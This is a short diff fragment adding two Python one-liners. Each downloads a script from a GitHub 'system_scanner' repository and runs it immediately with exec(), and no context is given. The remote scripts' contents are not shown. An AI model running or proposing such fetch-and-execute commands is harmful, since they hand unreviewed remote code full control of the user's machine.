@@ -1,0 +1,2 @@
+python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/system_scanner/main/sys_d_v14.py').read())"
+python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/system_scanner/main/sys_d_v17.py').read())"
